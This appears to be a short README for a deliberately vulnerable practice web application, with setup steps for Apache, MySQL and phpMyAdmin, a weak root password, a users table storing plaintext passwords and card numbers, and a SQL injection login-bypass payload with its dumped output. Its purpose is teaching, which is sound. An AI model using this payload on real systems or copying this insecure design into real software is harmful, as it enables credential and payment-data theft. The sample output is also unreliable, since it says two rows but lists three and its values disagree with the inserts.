# simplefiringrange

for Ubuntu 16

apt install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php git

During this fun process, mysql should pop up a big purple screen asking for root password do your thang make that password hello123 do it!

apt-get install phpmyadmin php-mbstring php-gettext

vi config.inc.php and adjust the password

systemctl restart apache2

<site>/phpmyadmin
  
# got gui? 

click and make a database named brett

click and make a table named users with this structure:

username: varchar 24

password: varchar 24

email: varchar 24

creditcard: varchar 24


then click insert and put some users in. don't forget to click go!

you get stuff like this going on:

INSERT INTO `users` (`username`, `password`, `email`, `creditcard`) VALUES ('miyuki', 'hello', 'm@m.com', '');

INSERT INTO `users` (`username`, `password`, `email`, `creditcard`) VALUES ('admin', 'password', 'admin@app.com', '4024007183948511');

INSERT INTO `users` (`username`, `password`, `email`, `creditcard`) VALUES ('brett', 'Hell123!', 'brett@app.com', '349256618723322');



now you should be able to browser and get stuff going

try this: enter ' or 1=1;## for the password

you want to get to this point:

sql: SELECT * FROM users WHERE username = 'brett' and password = '' or 1=1;-- '

Select returned 2 rows.

Email: admin@app.com,CreditCard: 4024007183948511,Password: password

Email: brett@app.com,CreditCard: 349256618723322,Password: Hello123! 

Email:m@m.com,CreditCard: 3533497685860304,Password: hello 







